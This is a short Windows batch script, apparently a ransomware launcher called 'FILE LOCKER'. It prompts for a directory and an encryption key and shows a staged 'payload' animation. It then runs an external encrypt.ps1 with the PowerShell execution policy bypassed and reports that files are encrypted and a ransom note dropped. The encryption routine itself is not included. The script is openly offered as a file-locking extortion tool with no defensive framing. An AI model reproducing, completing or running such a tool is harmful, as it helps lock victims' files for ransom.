@echo off
chcp 65001 >nul
title FILE LOCKER - mpck4
color 0D
cls
mode con: cols=100 lines=30

:: ---------- Banner ----------
:banner
echo [38;2;200;0;255m
echo       _____ _ _        _               _    
echo      ^|  ___(_) ^| ___  ^| ^|    ___   ___^| ^| __
echo      ^| ^|_  ^| ^| ^|/ _ \ ^| ^|   / _ \ / __^| ^|/ /
echo      ^|  _^| ^| ^| ^|  __/ ^| ^|__^| (_) ^| (__^|   ^< 
echo      ^|_^|   ^|_^|_^|\___^| ^|_____\___/ \___^|_^|\_\
echo [0m
echo.

:: ---------- Directory and Key ----------
set /p dir=Enter directory to lock files: 
set /p key=Enter encryption key: 

:: ---------- Fake Animation ----------
echo.
echo [93m[~] Initializing payload...[0m
ping 127.0.0.1 -n 2 >nul
echo [91m[!] Scanning directory...[0m
ping 127.0.0.1 -n 2 >nul
echo [91m[!] Encrypting files...[0m

:: ---------- Start Encryption with Fake Progress Bar ----------
powershell -ExecutionPolicy Bypass -File encrypt.ps1 "%dir%" "%key%"

echo.
echo [92m[✔] Files encrypted. Ransom note dropped.[0m
pause
exit
